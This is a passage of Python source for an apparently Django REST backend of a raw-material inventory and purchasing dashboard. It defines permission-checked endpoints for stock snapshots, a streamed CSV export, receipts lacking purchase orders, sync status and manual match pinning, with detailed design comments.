            setattr(lot, field_name, new_value)
            lot.save(update_fields=[field_name])
            MaterialCorrection.objects.create(
                plant=cfg.syncrun_plant,
                lot_id=lot_id,
                field_name=field_name,
                old_value="" if old_value is None else str(old_value),
                new_value="" if new_value is None else str(new_value),
                reason=reason,
                corrected_by=request.user if getattr(request.user, "pk", None) else None,
                corrected_by_email=getattr(request.user, "email", ""),
            )

        if field_name in cfg.material_rematch_trigger_fields:
            cfg.run_full_match()

        return Response({"status": "ok", "field": field_name, "value": _serialize(new_value)})

    return correct_material_field


def make_stock_trend(cfg: _PlantConfig):
    @api_view(["GET"])
    def stock_trend(request, lot_id: int):
        if not user_can_access_plant(request.user, cfg.key):
            return Response({"error": "You are not permitted to view this plant's stock trend."}, status=403)
        snapshots = cfg.stock_snapshot_model.objects.filter(stock_lot_id=lot_id).order_by("snapshot_date")
        return Response({
            "snapshots": [
                {
                    "date": s.snapshot_date.isoformat(),
                    "qty": float(s.todays_stock),
                    "rate": float(getattr(s, cfg.lot_rate_field)) if getattr(s, cfg.lot_rate_field) is not None else None,
                    "value": float(s.value) if s.value is not None else None,
                }
                for s in snapshots
            ]
        })

    return stock_trend


def make_stock_snapshot_dates(cfg: _PlantConfig):
    """Snapshot Pipeline Rebuild, Phase C.1 (see CLAUDE.md) - distinct
    snapshot dates for this plant, each with a lot count. Drives a date
    picker; the count doubles as a health signal - a date with far fewer
    lots than its neighbours means a partial sync."""

    @api_view(["GET"])
    def stock_snapshot_dates(request):
        from django.db.models import Count

        if not user_can_access_plant(request.user, cfg.key):
            return Response({"error": "You are not permitted to view this plant's stock snapshots."}, status=403)
        rows = (
            cfg.stock_snapshot_model.objects.values("snapshot_date")
            .annotate(lotCount=Count("id"))
            .order_by("-snapshot_date")
        )
        return Response({"dates": [{"date": r["snapshot_date"].isoformat(), "lotCount": r["lotCount"]} for r in rows]})

    return stock_snapshot_dates


def make_stock_snapshots_for_date(cfg: _PlantConfig):
    """Snapshot Pipeline Rebuild, Phase C.2 (see CLAUDE.md) - a whole
    plant's stock position on one date, joined to stock_lot for
    description/category/vendor. Defaults to the latest available date
    when `date` is omitted. Returns 404 with the nearest available dates
    when the requested (or defaulted) date has no snapshot rows at all -
    never an empty 200, which a client would render as "zero stock
    everywhere" and a reader would believe."""

    @api_view(["GET"])
    def stock_snapshots_for_date(request):
        if not user_can_access_plant(request.user, cfg.key):
            return Response({"error": "You are not permitted to view this plant's stock snapshots."}, status=403)

        date_param = request.query_params.get("date")
        if date_param:
            try:
                target_date = datetime.date.fromisoformat(date_param)
            except ValueError:
                return Response({"error": f"{date_param!r} is not a valid YYYY-MM-DD date."}, status=400)
        else:
            target_date = (
                cfg.stock_snapshot_model.objects.order_by("-snapshot_date")
                .values_list("snapshot_date", flat=True)
                .first()
            )
            if target_date is None:
                return Response({"error": "No snapshot history exists yet for this plant.", "availableDates": []}, status=404)

        snapshots = (
            cfg.stock_snapshot_model.objects.filter(snapshot_date=target_date)
            .select_related("stock_lot")
            .order_by("stock_lot__description")
        )
        if not snapshots.exists():
            nearest = (
                cfg.stock_snapshot_model.objects.values_list("snapshot_date", flat=True)
                .distinct()
                .order_by("-snapshot_date")[:5]
            )
            return Response({
                "error": f"No snapshot exists for {target_date.isoformat()}.",
                "availableDates": [d.isoformat() for d in nearest],
            }, status=404)

        return Response({
            "date": target_date.isoformat(),
            "lots": [
                {
                    "lotId": s.stock_lot_id,
                    "materialCode": getattr(s.stock_lot, cfg.lot_code_field) or str(s.stock_lot_id),
                    "description": s.stock_lot.description,
                    "category": getattr(s.stock_lot, "category", ""),
                    "vendor": getattr(s.stock_lot, cfg.lot_vendor_field, None) if cfg.lot_vendor_field else None,
                    "qty": float(s.todays_stock),
                    "rate": float(getattr(s, cfg.lot_rate_field)) if getattr(s, cfg.lot_rate_field) is not None else None,
                    "value": float(s.value) if s.value is not None else None,
                }
                for s in snapshots
            ],
        })

    return stock_snapshots_for_date


def make_export_stock_snapshots(cfg: _PlantConfig):
    """Data Export (2026-09-08, project owner request) - the full daily RM
    stock snapshot history as a downloadable CSV, optionally narrowed by
    `from`/`to` (both optional; omitting both exports everything captured so
    far). This is the ONE dataset the project owner specifically asked for
    here, not Purchase Orders/Import Purchases: the source Stock xlsx files
    only ever hold today's position (each sync overwrites the prior day's
    numbers in Postgres via update_or_create - see sync_utils.py), so the
    daily-snapshot table (`*RMSnapshot`, captured once a day - see CLAUDE.md's
    "Snapshot Pipeline Rebuild") is the ONLY place this day-by-day history
    exists at all; it cannot be reconstructed from the spreadsheets
    afterwards. CSV, not Excel - project owner asked for whichever is
    cheaper/faster, and building a .xlsx would mean pulling in openpyxl for
    no real benefit over a plain CSV any spreadsheet program opens directly.
    IsEditor + user_can_access_plant-gated (not a plain read like the rest of
    this file's GET endpoints) - project owner asked for Editor/Admin only,
    even though every other read endpoint here is IsAuthenticated-any-role.
    Reuses the exact same getattr(cfg.lot_*_field) pattern
    stock_snapshots_for_date() above already uses for the same per-plant
    schema differences (Achhad has no vendor/uom/sub_category field at all)."""

    @api_view(["GET"])
    @permission_classes([IsEditor])
    def export_stock_snapshots(request):
        if not user_can_access_plant(request.user, cfg.key):
            return Response({"error": "You are not permitted to export this plant's stock snapshots."}, status=403)

        from_param = request.query_params.get("from")
        to_param = request.query_params.get("to")
        try:
            from_date = datetime.date.fromisoformat(from_param) if from_param else None
            to_date = datetime.date.fromisoformat(to_param) if to_param else None
        except ValueError:
            return Response({"error": "`from`/`to` must be YYYY-MM-DD dates."}, status=400)

        qs = cfg.stock_snapshot_model.objects.select_related("stock_lot").order_by("snapshot_date", "stock_lot_id")
        if from_date:
            qs = qs.filter(snapshot_date__gte=from_date)
        if to_date:
            qs = qs.filter(snapshot_date__lte=to_date)

        # Streamed row-by-row rather than assembled in a StringIO and returned
        # as one body (2026-09-15, audit pass). The DB side was already
        # careful - `.iterator(chunk_size=2000)` never holds the whole
        # queryset - but every rendered row still accumulated in memory until
        # the last one was written, so peak usage tracked the FULL export size.
        # This table grows by one row per active lot per day, forever, across
        # three plants: an unbounded "export everything" request (the default,
        # since both date params are optional) is the one request in this app
        # whose memory cost has no ceiling at all. On Render's starter
        # instance that is an OOM that kills the worker for every other user,
        # triggered by one person clicking Export.
        #
        # StreamingHttpResponse + a generator keeps peak memory at one row
        # regardless of export size, and the browser starts receiving bytes
        # immediately instead of after the whole file is built - which also
        # keeps a large export from tripping gunicorn's 30s worker timeout.
        #
        # Trade-off, accepted deliberately: a streamed response carries no
        # Content-Length, so browsers show an indeterminate progress bar. Also
        # note an exception raised mid-stream cannot become a 500 - headers are
        # already sent - so this generator must not do anything that can fail
        # in a new way; it only formats rows the queryset already yielded.
        def _rows():
            echo = _Echo()
            writer = SafeCsvWriter(echo)
            yield writer.writerow([
                "Plant", "Snapshot Date", "Material Description", "Material Code", "Category",
                "Sub Category", "Vendor", "UOM", "Opening Stock", "Received", "Issued",
                "Today's Stock", "Rate", "Value", "Lot Currently Active",
            ])
            for snap in qs.iterator(chunk_size=2000):
                lot = snap.stock_lot
                yield writer.writerow([
                    cfg.key.upper(),
                    snap.snapshot_date.isoformat(),
                    lot.description,
                    getattr(lot, cfg.lot_code_field, "") or "",
                    getattr(lot, "category", "") or "",
                    getattr(lot, "sub_category", "") or "",
                    (getattr(lot, cfg.lot_vendor_field, "") or "") if cfg.lot_vendor_field else "",
                    getattr(lot, "uom", "") or "",
                    snap.opening_stock, snap.received, snap.issued, snap.todays_stock,
                    getattr(snap, cfg.lot_rate_field, None),
                    snap.value,
                    lot.is_active,
                ])

        filename = f"{cfg.key}_rm_stock_snapshots"
        if from_date or to_date:
            filename += f"_{from_date.isoformat() if from_date else 'start'}_to_{to_date.isoformat() if to_date else 'latest'}"
        filename += ".csv"
        response = StreamingHttpResponse(_rows(), content_type="text/csv")
        response["Content-Disposition"] = f'attachment; filename="{filename}"'
        return response

    return export_stock_snapshots


def make_mir_without_po(cfg: _PlantConfig):
    """The drill-down behind the "purchased without a PO" badge (2026-09-21,
    project owner: "we have orders without a PO in MIR, which might be true
    or waiting for a PO to be matched with them - can we show info about
    them?").

    sync_status already carried the COUNT, and main.js already showed it as
    a badge with a per-vendor tooltip. What it could not answer was which
    receipts those are, or - the actual question - whether a given one is
    finished business or pending: a receipt with no order behind it is a
    purchasing gap, an upstream PO-master gap, or a matcher gap, and those
    need three different people. This endpoint returns the rows, bucketed.
    See services/mir_without_po.py for what decides the bucket and why it
    reuses the matcher's own PO-number logic rather than a string compare.

    `?bucket=` narrows to one bucket (unknown value -> 400 rather than a
    silently empty list, which would read as "nothing to fix"). `?format=csv`
    returns the same rows as a download, so the purchase team can work
    through them in a spreadsheet and hand corrections back - the one thing
    a modal cannot do.

    Read-gated like every other GET here (IsAuthenticated + plant scope),
    NOT IsEditor. Unlike the stock-snapshot export this is not bulk history
    - it is a few hundred rows of the same MIR data the dashboard already
    shows a viewer, reorganized.
    """

    @api_view(["GET"])
    def mir_without_po(request):
        if not user_can_access_plant(request.user, cfg.key):
            return Response({"error": "You are not permitted to view this plant's MIR entries."}, status=403)

        bucket = request.query_params.get("bucket") or ""
        if bucket and bucket not in BUCKET_ORDER:
            return Response(
                {"error": f"Unknown bucket '{bucket}'. Expected one of: {', '.join(BUCKET_ORDER)}."},
                status=400,
            )

        unfiltered_rows = mir_without_po_rows(cfg.mir_model, cfg.match_config)
        rows = [r for r in unfiltered_rows if r["bucket"] == bucket] if bucket else unfiltered_rows

        # `?download=csv`, NOT `?format=csv`: `format` is reserved by DRF's
        # own content negotiation, which resolves it against the registered
        # renderers and 404s on an unknown one - so this branch was never
        # reached and the export answered "Not found". Caught by
        # test_mir_without_po_endpoint.py, which is why it is named here.
        if request.query_params.get("download") == "csv":
            echo = _Echo()
            writer = SafeCsvWriter(echo)
            # Built eagerly, not streamed, unlike export_stock_snapshots():
            # that endpoint's row count has no ceiling (one row per lot per
            # day, forever), this one is bounded by the active MIR table and
            # is a few hundred rows per plant. Streaming would only cost the
            # Content-Length header for no benefit.
            lines = [writer.writerow([
                "Plant", "Why it is unreconciled", "MIR No", "MIR Date", "PO Number in MIR", "Vendor",
                "Material", "Qty", "UOM", "Value", "Invoice No", "Invoice Date", "Category",
                "Matched anyway", "Vendor on the no-PO list", "MIR Sheet Row",
            ])]
            for r in rows:
                lines.append(writer.writerow([
                    cfg.key.upper(), BUCKET_LABELS[r["bucket"]], r["mirNo"], r["mirDate"] or "",
                    r["poNumberRaw"], r["vendor"], r["description"], r["qty"], r["uom"], r["value"],
                    r["invoiceNo"], r["invoiceDate"] or "", r["category"],
                    "yes" if r["matched"] else "no",
                    "yes" if r["registeredNoPoVendor"] else "no",
                    r["sourceRowRef"],
                ]))
            filename = f"{cfg.key}_mir_without_po{('_' + bucket) if bucket else ''}.csv"
            response = HttpResponse("".join(lines), content_type="text/csv")
            response["Content-Disposition"] = f'attachment; filename="{filename}"'
            return response

        return Response({
            # `rows` passed through so the summary reuses this request's
            # single pass over the MIR table instead of walking it again.
            # When ?bucket= narrowed the list, the summary is still built
            # from the FULL set (unfiltered_rows) - the panel's bucket tabs
            # show every bucket's count no matter which one is open.
            "summary": mir_without_po_summary(cfg.mir_model, cfg.match_config, unfiltered_rows),
            "rows": rows,
        })

    return mir_without_po


def _cached_mir_without_po_summary(cfg: _PlantConfig) -> dict:
    """`mir_without_po_summary()` behind a 60-second per-plant cache, for
    `sync_status` only.

    Measured before adding the cache: 135ms (HRS), 53ms (Achhad), 163ms
    (Vapi), against a `/sync-status` that answered in ~20-30ms. That endpoint
    is polled every 60 seconds per selected plant by main.js's freshness
    watcher (see CLAUDE.md), so paying it on every poll would make the app's
    most frequently hit endpoint several times slower for a number that only
    changes when a sync/match run finishes. The cost is `_names_known_po()`
    scanning every known PO number per candidate row - the same shape that
    makes `_po_number_contradicts()` a hot path in the matcher, and not
    something to work around by re-deriving a faster, second idea of what a
    known PO number is.

    60 seconds because that is the poll interval: the badge can be at most
    one tick stale, which is well inside the time between syncs. The CACHED
    VALUE IS PLANT-DERIVED DATA, NOT A RESPONSE - the permission check still
    runs per request in the view above, so this is not the `cache_page`
    trap CLAUDE.md warns about (that one short-circuits the view entirely and
    serves one caller's response to another).

    /mir-without-po itself is deliberately NOT cached: it is opened
    deliberately, not polled, and a reader who just corrected something
    should see the result.
    """
    key = f"mir_without_po_summary:{cfg.key}"
    cached = cache.get(key)
    if cached is None:
        cached = mir_without_po_summary(cfg.mir_model, cfg.match_config)
        cache.set(key, cached, 60)
    return cached


def make_sync_status(cfg: _PlantConfig):
    @api_view(["GET"])
    def sync_status(request):
        from django.utils import timezone

        from apps.core.models import SyncRun

        if not user_can_access_plant(request.user, cfg.key):
            return Response({"error": "You are not permitted to view this plant's sync status."}, status=403)

        latest_by_source = {}
        for run in SyncRun.objects.filter(plant=cfg.syncrun_plant).order_by("source", "-started_at"):
            if run.source not in latest_by_source:
                latest_by_source[run.source] = {
                    "status": run.status,
                    "startedAt": run.started_at.isoformat(),
                    "finishedAt": run.finished_at.isoformat() if run.finished_at else None,
                    "rowsSeen": run.rows_seen,
                    "rowsChanged": run.rows_changed,
                    "errorDetail": run.error_detail or None,
                }

        # Snapshot Pipeline Rebuild, Phase B.4 (see CLAUDE.md) - makes a
        # silently-dead qcluster visible instead of indistinguishable from a
        # healthy one: without this, the only symptom of a missed daily
        # snapshot is the Days-Left Engine going quietly wrong weeks later.
        last_snapshot_date = (
            cfg.stock_snapshot_model.objects.order_by("-snapshot_date")
            .values_list("snapshot_date", flat=True)
            .first()
        )
        snapshot_gap_days = (timezone.localdate() - last_snapshot_date).days if last_snapshot_date else None

        resp = Response({
            "sync": latest_by_source,
            "mirEntryCount": cfg.mir_model.objects.filter(is_active=True).count(),
            # No-PO vendors, 2026-09-17. The registry in parsers/common.py
            # drops these vendors' MIR rows from the PO<->MIR candidate pool
            # because there is no order for them to match and never will be
            # (own plants' inter-unit transfers, plus a handful of real
            # suppliers bought from without a PO). One list covers all three
            # plants. Reported here so that exclusion is VISIBLE rather
            # than silent - without it these rows are indistinguishable from
            # ones the matcher merely failed on, which is the exact confusion
            # the registry exists to end. The noPoSupplier half in
            # particular needs watching: those are a process gap, and the day
            # one starts being PO'd its registry entry has to go or its
            # orders are silently excluded. See services/no_po_vendors.py.
            "noPoVendors": no_po_vendor_summary(cfg.mir_model),
            # Purchased without a PO, 2026-09-18 (project owner: "sometimes
            # they create a PO, sometimes they don't, mostly they don't").
            # noPoVendors above reports what the REGISTRY excluded; this
            # reports what the BUSINESS actually did, per row, and is the
            # number meant to be driven down. See
            # services/no_po_vendors.py's purchases_without_po_summary() for
            # why a vendor-level list cannot answer it.
            "purchasesWithoutPo": purchases_without_po_summary(cfg.mir_model),
            # The same question asked three ways, 2026-09-21 (project owner:
            # "orders without a PO in MIR, which might be true or waiting for
            # a PO to be matched with them"). purchasesWithoutPo above is one
            # of these three buckets - the receipts that name no order at
            # all - and this adds the two that are genuinely PENDING rather
            # than finished: MIR names an order we don't hold (upstream PO
            # master gap), and MIR names one we do hold that the matcher has
            # not linked (ours). Counts only here; the rows themselves come
            # from /mir-without-po, which the badge links to. See
            # services/mir_without_po.py.
            "mirWithoutPo": _cached_mir_without_po_summary(cfg),
            # What MIR<->Stock deliberately skips, 2026-09-21. The MIR<->Stock
            # counterpart of noPoVendors/purchasesWithoutPo above, and a
            # genuinely separate question: not "this had no purchase order"
            # but "the RM Stock sheet does not hold this at all" - conveyor
            # fabric and belting, un-named rubber compound, crates, spares,
            # plus Madura by vendor. Reported for the same reason the PO-side
            # numbers are: an out-of-scope row and a row the matcher failed on
            # are indistinguishable otherwise. Drives the Raw Material
            # Analysis badge in main.js. See services/rm_untracked.py.
            "rmUntracked": rm_untracked_summary(cfg.mir_model, cfg.key),
            # Retired purchase orders, 2026-09-18. An order the master CSV no
            # longer lists is deactivated by the sync rather than deleted (see
            # sync_utils.deactivate_missing_orders()). Surfaced here because
            # the previous version of this mechanism reported orphans to the
            # sync command's stdout ONLY - which under the scheduled django-q2
            # run nobody ever reads, so they accumulated for months while
            # competing for MIR rows. A number on screen is what stops that
            # happening again. A non-zero count is normal after a bulk rename
            # upstream; a growing one is worth a look with
            # `manage.py report_retired_pos`.
            "retiredPoCount": cfg.po_model.objects.filter(is_active=False).count(),
            "syncInProgress": is_sync_in_progress(cfg.key),
            "lastSnapshotDate": last_snapshot_date.isoformat() if last_snapshot_date else None,
            "snapshotGapDays": snapshot_gap_days,
        })
        # This endpoint's whole purpose is reporting LIVE state
        # (syncInProgress in particular - the dashboard's "syncing..."
        # badge) - a response with no explicit Cache-Control is still
        # eligible for a browser's heuristic HTTP cache (RFC 7234), which
        # can make a plain reload replay a stale cached response while a
        # hard refresh (which bypasses the HTTP cache) shows the real,
        # current state - reported by the project owner 2026-09-09 as
        # "the frontend still shows syncing" after a sync had already
        # finished, fixed only by a hard refresh. no-store forces every
        # request for this endpoint to hit the server fresh, regardless of
        # how the page itself was reloaded.
        resp["Cache-Control"] = "no-store"
        return resp

    return sync_status


def make_sync_trigger(cfg: _PlantConfig):
    @api_view(["POST"])
    @permission_classes([IsAdmin])
    @throttle_classes([SyncTriggerThrottle])
    def sync_trigger(request):
        started = trigger_plant_sync(cfg.key)
        if not started:
            return Response({"status": "already_running"}, status=409)
        return Response({"status": "started"}, status=202)

    return sync_trigger


def make_dismiss_po_mir_match(cfg: _PlantConfig):
    @api_view(["PATCH"])
    @permission_classes([IsEditor])
    def dismiss_po_mir_match(request, match_id: int):
        if not user_can_edit_plant(request.user, cfg.key):
            return Response({"error": "You are not permitted to edit this plant's matches."}, status=403)
        dismissed = bool(request.data.get("dismissed", True))
        reason = (request.data.get("reason") or "").strip()
        match = dismiss_match(cfg.po_mir_match_model, match_id, request.user, dismissed, reason)
        if not match:
            return Response({"error": "Match not found."}, status=404)
        return Response({
            "status": "ok",
            "matchId": match.id,
            "dismissedByOverride": match.dismissed_by_override,
            "dismissedReason": match.dismissed_reason,
        })

    return dismiss_po_mir_match


def make_dismiss_mir_stock_match(cfg: _PlantConfig):
    @api_view(["PATCH"])
    @permission_classes([IsEditor])
    def dismiss_mir_stock_match(request, match_id: int):
        if not user_can_edit_plant(request.user, cfg.key):
            return Response({"error": "You are not permitted to edit this plant's matches."}, status=403)
        dismissed = bool(request.data.get("dismissed", True))
        reason = (request.data.get("reason") or "").strip()
        match = dismiss_match(cfg.mir_stock_match_model, match_id, request.user, dismissed, reason)
        if not match:
            return Response({"error": "Match not found."}, status=404)
        return Response({
            "status": "ok",
            "matchId": match.id,
            "dismissedByOverride": match.dismissed_by_override,
            "dismissedReason": match.dismissed_reason,
        })

    return dismiss_mir_stock_match


def make_dismiss_flag(cfg: _PlantConfig):
    @api_view(["PATCH"])
    @permission_classes([IsEditor])
    def dismiss_flag(request, po_number):
        if not user_can_edit_plant(request.user, cfg.key):
            return Response({"error": "You are not permitted to edit this plant's purchase orders."}, status=403)
        flag_key = (request.data.get("flagKey") or "").strip()
        if not flag_key:
            return Response({"error": "flagKey is required."}, status=400)
        dismissed = bool(request.data.get("dismissed", True))
        reason = (request.data.get("reason") or "").strip()
        fd = dismiss_po_flag(cfg.syncrun_plant, po_number, flag_key, request.user, dismissed, reason)
        return Response(_flag_dismissal_dict(fd))

    return dismiss_flag


# ── Manual MIR match ────────────────────────────────────────────────────
# "The edit option - it would be great if we can edit the MIR number too, and
# if that was assigned to some other PO then a pop up would appear telling
# that matching with this would break so and so" (project owner, 2026-09-21).
#
# Two endpoints: one to LOOK UP candidate MIR numbers (with the collision
# information the popup needs), one to SET the pin. Deliberately split -
# the reader has to be told what a change will cost BEFORE committing to it,
# and the backend is the only side that can see which other line items
# currently hold rows of that document.
#
# Scoped to Domestic POs. Import POs match against the same MIR table but
# through their own cross-plant router, and nothing has asked for it there.


def _mir_row_dict(row):
    return {
        "mirNo": row.mir_no,
        "mirDate": row.mir_date.isoformat() if row.mir_date else None,
        "party": row.party_name,
        "material": row.material_description,
        "qty": float(row.qty) if row.qty is not None else None,
        "uom": row.uom,
        "rate": float(row.rate) if row.rate is not None else None,
        "invoiceNo": row.invoice_no,
        "poNumberRaw": row.po_number_raw,
    }


def _claims_for_mir_numbers(cfg, mir_numbers):
    """{mir_no: [{poNumber, itemRef, description}, ...]} - which Domestic PO
    line items currently hold a row of each of these MIR documents.

    This is what the popup warns about, and it is read from the MATCH table
    rather than from the pins: a row can be held by an ordinary automatic
    match just as easily as by someone else's pin, and losing either one is
    equally worth knowing about before you take it."""
    if not mir_numbers:
        return {}
    matches = (
        cfg.po_mir_match_model.objects
        .filter(mir_entry__mir_no__in=mir_numbers, po_line_item__purchase_order__is_active=True)
        .select_related("mir_entry", "po_line_item", "po_line_item__purchase_order")
    )
    # Positions are per PO, so they have to be derived from that PO's full
    # item list - the same numbering the matcher and the pin both use.
    ref_by_item_id = _item_refs_for_pos(cfg, {m.po_line_item.purchase_order_id for m in matches})
    out: dict = {}
    for m in matches:
        out.setdefault(m.mir_entry.mir_no, []).append({
            "poNumber": m.po_line_item.purchase_order.po_number,
            "itemRef": ref_by_item_id.get(m.po_line_item_id, ""),
            "description": m.po_line_item.description,
            "manuallyPinned": bool(getattr(m, "manually_pinned", False)),
        })
    return out


def _item_refs_for_pos(cfg, po_ids):
    """{line item id: item_ref} for every line item of these POs, using
    matching_core's own numbering so the API and the matcher can never
    disagree about which line a pin addresses."""
    if not po_ids:
        return {}
    items = list(
        cfg.item_model.objects.filter(purchase_order_id__in=po_ids).select_related("purchase_order")
    )
    return {item_id: ref for item_id, (_po, ref, _desc) in line_item_positions(items).items()}


def make_mir_candidates(cfg: _PlantConfig):
    """GET .../purchase-orders/<po>/mir-candidates?q=<text>&itemRef=<n>

    MIR documents this line could be pinned to, newest first, each with who
    currently holds it. `q` filters on MIR number, party or material; with
    no `q` it returns the rows this plant's MIR already associates with this
    PO number plus the most recent ones, which is what a reader opening the
    picker most often wants."""

    @api_view(["GET"])
    def mir_candidates(request, po_number):
        if not user_can_access_plant(request.user, cfg.key):
            return Response({"error": "You are not permitted to view this plant."}, status=403)
        po = cfg.po_model.objects.filter(po_number=po_number, is_active=True).first()
        if not po:
            return Response({"error": "Purchase order not found."}, status=404)

        q = (request.query_params.get("q") or "").strip()
        rows = cfg.mir_model.objects.filter(is_active=True)
        if q:
            rows = rows.filter(
                Q(mir_no__icontains=q) | Q(party_name__icontains=q) | Q(material_description__icontains=q)
            )
        else:
            # No search text: the rows that already mention this PO number,
            # then recent ones. A blank picker listing the whole register in
            # arbitrary order would be useless on a 1,489-row MIR file.
            rows = rows.filter(Q(po_number_raw__icontains=po_number) | Q(mir_date__isnull=False))
        rows = list(rows.order_by("-mir_date", "-id")[:80])

        claims = _claims_for_mir_numbers(cfg, {r.mir_no for r in rows if r.mir_no})
        # One entry per MIR NUMBER, not per row - a pin names the document
        # and the matcher picks the row, so offering rows would promise a
        # precision the feature deliberately does not have.
        seen: dict = {}
        for row in rows:
            if not row.mir_no:
                continue
            entry = seen.get(row.mir_no)
            if entry is None:
                entry = dict(_mir_row_dict(row))
                entry["rowCount"] = 0
                entry["claimedBy"] = claims.get(row.mir_no, [])
                seen[row.mir_no] = entry
            entry["rowCount"] += 1
        return Response({"candidates": list(seen.values())})

    return mir_candidates


def make_set_mir_match(cfg: _PlantConfig):
    """PATCH .../purchase-orders/<po>/mir-match

    Body: {itemRef, mirNo, reason, clear}
      - `mirNo` non-empty  -> pin this line to that MIR document
      - `mirNo` empty      -> pin it as deliberately UNMATCHED
      - `clear: true`      -> remove the pin, back to automatic matching
    """

    @api_view(["PATCH"])
    @permission_classes([IsEditor])
    def set_mir_match(request, po_number):
        if not user_can_edit_plant(request.user, cfg.key):
            return Response({"error": "You are not permitted to edit this plant's purchase orders."}, status=403)

        item_ref = str(request.data.get("itemRef") or "").strip()
        mir_no = (request.data.get("mirNo") or "").strip()
        reason = (request.data.get("reason") or "").strip()
        clear = bool(request.data.get("clear"))

        po = cfg.po_model.objects.filter(po_number=po_number, is_active=True).first()
        if not po:
            return Response({"error": "Purchase order not found."}, status=404)

        items = list(cfg.item_model.objects.filter(purchase_order=po).select_related("purchase_order"))
        refs = line_item_positions(items)
        target = next((i for i in items if refs[i.id][1] == item_ref), None)
        if target is None:
            return Response({"error": "Line item not found on this purchase order."}, status=404)

        if clear:
            ManualMirMatch.objects.filter(
                plant=cfg.syncrun_plant, po_number=po_number, item_ref=item_ref).delete()
        else:
            if mir_no and not cfg.mir_model.objects.filter(is_active=True, mir_no=mir_no).exists():
                return Response({"error": f"No active MIR entry numbered {mir_no!r} at this plant."}, status=400)
            ManualMirMatch.objects.update_or_create(
                plant=cfg.syncrun_plant,
                po_number=po_number,
                item_ref=item_ref,
                defaults=dict(
                    mir_no=mir_no,
                    # Captured now, compared on every later run - see
                    # ManualMirMatch's docstring on staleness.
                    item_description=target.description or "",
                    reason=reason,
                    created_by=request.user if getattr(request.user, "pk", None) else None,
                    created_by_email=getattr(request.user, "email", ""),
                ),
            )

        # Synchronous, same as an "Edit Everywhere" save to a matching field
        # (see _REMATCH_TRIGGER_FIELDS): the reader is looking at the badge
        # they just changed, and run_full_match() is idempotent and cheap at
        # these data volumes.
        result = cfg.run_full_match()
        return Response({
            "status": "ok",
            "itemRef": item_ref,
            "mirNo": "" if clear else mir_no,
            "cleared": clear,
            "manualPinsApplied": result.get("manual_pins_applied"),
            "stalePins": result.get("manual_pins_stale", []),
        })

    return set_mir_match
